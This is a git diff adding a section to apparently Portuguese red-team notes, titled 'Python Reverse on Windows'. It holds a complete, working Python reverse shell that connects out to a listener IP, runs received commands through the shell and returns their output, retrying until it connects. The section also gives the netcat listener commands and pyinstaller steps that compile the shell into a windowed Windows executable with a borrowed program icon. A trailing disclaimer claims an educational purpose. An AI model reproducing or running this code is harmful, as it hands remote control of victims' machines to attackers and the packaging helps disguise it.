@@ -471,6 +471,122 @@ Sub RedScan()
     MsgBox "Arquivo salvo em C:\Users\admin\Desktop\systeminfo.txt"
 End Sub
 ```
+
+## Python Reverse on Windows
+
+### Install python
+https://www.python.org/downloads/
+
+### Install pyinstaller
+```
+python -m pip install pyinstaller
+```
+Adicionar ao PATH
+```
+C:\Users\admin\AppData\Local\Python\pythoncore-3.15-64\Scripts
+```
+
+### Download ico file
+https://www.iconarchive.com/show/my-seven-icons-by-itzikgur/Programs-Windows-icon.html
+
+### Python rev
+```
+#!/usr/bin/env python3
+# Cliente de teste - laborat├│rio autorizado
+import socket
+import subprocess
+import sys
+import time
+
+ATTACKER_IP = "192.168.52.50"   # IP do listener (ajuste para seu lab)
+ATTACKER_PORT = 4433            # porta do listener (ajuste conforme necess├írio)
+RECV_SIZE = 4096
+RETRY_DELAY = 5                 # segundos entre tentativas se falhar conectar
+
+def run():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(15)
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            s.settimeout(None)  # remover timeout ap├│s conectar
+            while True:
+                data = s.recv(RECV_SIZE)
+                if not data:
+                    # conex├úo fechada pelo listener
+                    break
+
+                try:
+                    cmd = data.decode('utf-8', errors='ignore').strip()
+                except Exception:
+                    cmd = ""
+
+                if cmd.lower() == "exit":
+                    s.close()
+                    return
+
+                if cmd == "":
+                    # comando vazio ΓÇö responde algo para manter o protocolo simples
+                    s.sendall(b"\n")
+                    continue
+
+                # Executa o comando e captura stdout+stderr
+                try:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                except subprocess.CalledProcessError as e:
+                    output = e.output or b""
+                except Exception as e:
+                    output = f"Erro executando comando: {e}\n".encode('utf-8')
+
+                if not output:
+                    output = b"\n"  # evita enviar zero bytes
+
+                # Envia tudo
+                try:
+                    s.sendall(output)
+                except Exception:
+                    # falha no envio -> encerra loop interno e tenta reconectar
+                    break
+
+            s.close()
+
+        except KeyboardInterrupt:
+            print("Interrompido pelo usu├írio.", file=sys.stderr)
+            return
+        except Exception as e:
+            # Falha na conex├úo - aguarda e tenta novamente (├║til em lab)
+            # Remova prints/pausas em produ├º├úo de avalia├º├úo
+            # print(f"[DEBUG] Conex├úo falhou: {e}", file=sys.stderr)
+            time.sleep(RETRY_DELAY)
+            continue
+
+if __name__ == "__main__":
+    run()
+```
+### Rev by python directly
+```
+nc -nlvp 4433
+```
+```
+python rev.py
+```
+
+### Compile rev.py to PE binary
+```
+pyinstaller --onefile --windowed --icon=Windows.ico rev.py
+```
+```
+nc -nlvp 4433
+```
+```
+cd build
+```
+```
+rev.exe
+```
+
+
+
 # Aviso de Isenção de Responsabilidade – Material de Red Team
 Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. As técnicas, exemplos e cenários aqui descritos têm como objetivo demonstrar vulnerabilidades potenciais e auxiliar profissionais de segurança na prevenção, detecção e resposta a ameaças.
 
